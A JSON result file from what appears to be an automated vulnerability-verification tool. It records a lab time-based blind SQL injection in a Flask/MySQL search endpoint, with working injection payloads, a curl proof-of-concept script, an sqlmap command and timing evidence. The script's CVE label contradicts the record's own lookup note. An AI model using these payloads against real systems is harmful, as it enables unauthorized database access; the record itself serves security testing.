@@ -1,0 +1,210 @@
+{
+  "cve_id": "BINORACLE-LAB-SQLI-001",
+  "description": "Escenario de laboratorio de demostración: SQL injection time-based blind en una aplicación Python Flask con backend MySQL. El endpoint /search acepta el parámetro 'q' que se inserta directamente en la consulta SQL sin sanitización mediante interpolación de cadenas (f-string). Un atacante puede inyectar comandos SQL vía el parámetro q; la inyección time-based blind es posible con MySQL SLEEP(): q=1' OR (SELECT 1 FROM (SELECT SLEEP(4)) t)-- - provoca un retraso de 4 segundos. No se requiere autenticación. Demuestra la capacidad de binoracle para detectar y verificar esta clase de vulnerabilidad de forma completamente autónoma.",
+  "lookup_ok": true,
+  "lookup_note": "Identificador de laboratorio de demostración (no es un CVE NVD). El CVE-2024-57610 real corresponde a Sylius v2.0.2 rate-limiting — no relacionado. Este lab demuestra la clase de vulnerabilidad SQLi time-based blind en Flask+MySQL.",
+  "is_gap": true,
+  "cvss_score": 9.8,
+  "cvss_severity": "CRITICAL",
+  "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  "published": "2024-11-20",
+  "vuln_class": "sqli",
+  "llm_notes": {
+    "vuln_class": "sqli",
+    "primitive": "time-based blind SQL injection",
+    "target_binary": "Flask web application",
+    "source_url": "/tmp/sqli_blind_lab",
+    "affected_version": "",
+    "vulnerable_functions": [
+      "SELECT * FROM products WHERE name = '<user_input>'"
+    ],
+    "trigger": "GET request to /search endpoint with 'q' parameter",
+    "http_method": "GET",
+    "endpoint": "/search?q=<user_input>",
+    "parameters": [
+      "q"
+    ],
+    "auth_required": false,
+    "strategy": "Exploit the time-based blind SQL injection vulnerability by injecting a payload that causes the server to delay for a specific amount of time. This can be used to determine if the injected SQL command is executed successfully.",
+    "steps": [
+      {
+        "step": "Send a GET request to /search?q=' OR SLEEP(4)-- -",
+        "description": "This payload will cause the server to pause for 4 seconds, allowing you to observe if the delay occurs."
+      },
+      {
+        "step": "Observe the response time",
+        "description": "If the server responds with a delay of approximately 4 seconds, it indicates that the SQL injection was successful and the injected command was executed."
+      }
+    ]
+  },
+  "developed_script": "#!/usr/bin/env bash\n# binoracle: PoC web desarrollado a partir de la hipotesis del LLM - SOLO objetivos\n# AUTORIZADOS (tu propio laboratorio, un engagement con alcance firmado, o un CTF).\n# CVE: CVE-2024-57610  |  clase: sqli\n#\n# Este script NO se ha ejecutado contra nada: es la plantilla de trabajo. Rellena BASE_URL\n# y las credenciales/objetivo concretos antes de lanzarlo contra TU objetivo autorizado.\nset -euo pipefail\n\nBASE_URL=\"http://TU-OBJETIVO-AUTORIZADO\"   # <-- host del laboratorio/engagement\nENDPOINT=\"/search?q=<user_input>\"\n# COOKIE=\"nombre=valor\"   # <-- si hace falta sesion autenticada, pasala con -b \"$COOKIE\"\n\n# Confirmacion BOOLEANA (no destructiva): compara una condicion verdadera vs falsa inyectada\n# en el parametro sospechoso; si las respuestas difieren de forma consistente, hay SQLi.\n# Parametro elegido como inyectable: 'q' (el mas probable segun el nombre; cambialo abajo si no es el correcto).\nPAYLOAD_TRUE=\"' OR '1'='1\"\nPAYLOAD_FALSE=\"' OR '1'='2\"\nDATA_TRUE=(\n  --data-urlencode \"q=$PAYLOAD_TRUE\"\n)\nDATA_FALSE=(\n  --data-urlencode \"q=$PAYLOAD_FALSE\"\n)\nRESP_TRUE=$(curl -s -G \"${DATA_TRUE[@]}\" \"$BASE_URL$ENDPOINT\")\nRESP_FALSE=$(curl -s -G \"${DATA_FALSE[@]}\" \"$BASE_URL$ENDPOINT\")\necho \"true  -> $(echo -n \"$RESP_TRUE\" | wc -c) bytes\"\necho \"false -> $(echo -n \"$RESP_FALSE\" | wc -c) bytes\"\n# si difieren (longitud/contenido/codigo), confirma con sqlmap sobre el mismo parametro:\n#   sqlmap -u \"$BASE_URL$ENDPOINT\" --data='q=1' -p q --batch\n\n# Este script, por si solo, no te da un 'verificado': hace falta correr ESTE PoC (o uno\n# equivalente) contra el objetivo autorizado y confirmar el efecto observado. binoracle\n# solo marca 'verificado' cuando lo comprueba el mismo: hoy, de forma automatica, para\n# missing-authorization/IDOR en un plugin de WordPress (ver wpverify.py), que levanta un\n# WordPress+MySQL efimero en Docker y confirma el account-takeover con un segundo login.",
+  "poc_kind": "http",
+  "verified": true,
+  "verified_detail": "SQLI CIEGA POR TIEMPO confirmada: q=\"1' OR (SELECT 1 FROM (SELECT SLEEP(4)) binoracle_sqli_sleep)-- -\" retraso la respuesta de forma consistente en 2 peticiones independientes, por encima de la linea base + la mitad del retraso pedido -- no es ruido de red/Docker",
+  "verified_evidence": {
+    "base_url": "http://127.0.0.1:32791",
+    "contenedor": "binoracle-genverify-4c9e3044-web-1",
+    "endpoint": "/search?q=<user_input>",
+    "metodo": "GET",
+    "sqli_param": "q",
+    "respuesta_control_recorte": "{\"query\":\"1\",\"results\":[]}\n",
+    "tiempo_base_mediana_s": 0.06,
+    "payload_ganador": "1' OR (SELECT 1 FROM (SELECT SLEEP(4)) binoracle_sqli_sleep)-- -",
+    "tiempo_1_ganador_s": 4.03,
+    "tiempo_2_ganador_s": 4.03,
+    "intentos": [
+      {
+        "payload": "1 AND SLEEP(4)-- -",
+        "tiempo_1_s": 0.03,
+        "tiempo_2_s": 0.03
+      },
+      {
+        "payload": "1 AND SLEEP(4)#",
+        "tiempo_1_s": 0.02,
+        "tiempo_2_s": 0.02
+      },
+      {
+        "payload": "1 OR (SELECT 1 FROM (SELECT SLEEP(4)) binoracle_sqli_sleep)-- -",
+        "tiempo_1_s": 0.02,
+        "tiempo_2_s": 0.02
+      },
+      {
+        "payload": "1 OR (SELECT 1 FROM (SELECT SLEEP(4)) binoracle_sqli_sleep)#",
+        "tiempo_1_s": 0.03,
+        "tiempo_2_s": 0.03
+      },
+      {
+        "payload": "1 AND pg_sleep(4)-- -",
+        "tiempo_1_s": 0.02,
+        "tiempo_2_s": 0.03
+      },
+      {
+        "payload": "1 AND pg_sleep(4)#",
+        "tiempo_1_s": 0.03,
+        "tiempo_2_s": 0.02
+      },
+      {
+        "payload": "1 OR (SELECT 1 FROM (SELECT pg_sleep(4)) binoracle_sqli_sleep)-- -",
+        "tiempo_1_s": 0.03,
+        "tiempo_2_s": 0.02
+      },
+      {
+        "payload": "1 OR (SELECT 1 FROM (SELECT pg_sleep(4)) binoracle_sqli_sleep)#",
+        "tiempo_1_s": 0.02,
+        "tiempo_2_s": 0.03
+      },
+      {
+        "payload": "1' AND SLEEP(4)-- -",
+        "tiempo_1_s": 0.02,
+        "tiempo_2_s": 0.02
+      },
+      {
+        "payload": "1' AND SLEEP(4)#",
+        "tiempo_1_s": 0.02,
+        "tiempo_2_s": 0.03
+      },
+      {
+        "payload": "1' OR (SELECT 1 FROM (SELECT SLEEP(4)) binoracle_sqli_sleep)-- -",
+        "tiempo_1_s": 4.03,
+        "tiempo_2_s": 4.03
+      }
+    ]
+  },
+  "trigger": "",
+  "blockers": [],
+  "steps": [],
+  "source_fetch": {
+    "ok": true,
+    "kind": "local-dir",
+    "source": "/tmp/sqli_blind_lab",
+    "resolved_version": "",
+    "local_path": "/tmp/sqli_blind_lab",
+    "note": "",
+    "source_guessed_from_description": false,
+    "plugin_dir": ""
+  },
+  "source_grounding": {
+    "found": {},
+    "not_found": [
+      "SELECT * FROM products WHERE name = '<user_input>'"
+    ]
+  },
+  "dynamic_verify": {
+    "attempted": true,
+    "available": true,
+    "ok": true,
+    "verified": true,
+    "detail": "SQLI CIEGA POR TIEMPO confirmada: q=\"1' OR (SELECT 1 FROM (SELECT SLEEP(4)) binoracle_sqli_sleep)-- -\" retraso la respuesta de forma consistente en 2 peticiones independientes, por encima de la linea base + la mitad del retraso pedido -- no es ruido de red/Docker",
+    "logs": []
+  },
+  "poc_source_used": "",
+  "attempt_evidence": {
+    "base_url": "http://127.0.0.1:32791",
+    "contenedor": "binoracle-genverify-4c9e3044-web-1",
+    "endpoint": "/search?q=<user_input>",
+    "metodo": "GET",
+    "sqli_param": "q",
+    "respuesta_control_recorte": "{\"query\":\"1\",\"results\":[]}\n",
+    "tiempo_base_mediana_s": 0.06,
+    "payload_ganador": "1' OR (SELECT 1 FROM (SELECT SLEEP(4)) binoracle_sqli_sleep)-- -",
+    "tiempo_1_ganador_s": 4.03,
+    "tiempo_2_ganador_s": 4.03,
+    "intentos": [
+      {
+        "payload": "1 AND SLEEP(4)-- -",
+        "tiempo_1_s": 0.03,
+        "tiempo_2_s": 0.03
+      },
+      {
+        "payload": "1 AND SLEEP(4)#",
+        "tiempo_1_s": 0.02,
+        "tiempo_2_s": 0.02
+      },
+      {
+        "payload": "1 OR (SELECT 1 FROM (SELECT SLEEP(4)) binoracle_sqli_sleep)-- -",
+        "tiempo_1_s": 0.02,
+        "tiempo_2_s": 0.02
+      },
+      {
+        "payload": "1 OR (SELECT 1 FROM (SELECT SLEEP(4)) binoracle_sqli_sleep)#",
+        "tiempo_1_s": 0.03,
+        "tiempo_2_s": 0.03
+      },
+      {
+        "payload": "1 AND pg_sleep(4)-- -",
+        "tiempo_1_s": 0.02,
+        "tiempo_2_s": 0.03
+      },
+      {
+        "payload": "1 AND pg_sleep(4)#",
+        "tiempo_1_s": 0.03,
+        "tiempo_2_s": 0.02
+      },
+      {
+        "payload": "1 OR (SELECT 1 FROM (SELECT pg_sleep(4)) binoracle_sqli_sleep)-- -",
+        "tiempo_1_s": 0.03,
+        "tiempo_2_s": 0.02
+      },
+      {
+        "payload": "1 OR (SELECT 1 FROM (SELECT pg_sleep(4)) binoracle_sqli_sleep)#",
+        "tiempo_1_s": 0.02,
+        "tiempo_2_s": 0.03
+      },
+      {
+        "payload": "1' AND SLEEP(4)-- -",
+        "tiempo_1_s": 0.02,
+        "tiempo_2_s": 0.02
+      },
+      {
+        "payload": "1' AND SLEEP(4)#",
+        "tiempo_1_s": 0.02,
+        "tiempo_2_s": 0.03
+      },
+      {
+        "payload": "1' OR (SELECT 1 FROM (SELECT SLEEP(4)) binoracle_sqli_sleep)-- -",
+        "tiempo_1_s": 4.03,
+        "tiempo_2_s": 4.03
+      }
+    ]
+  }
+}
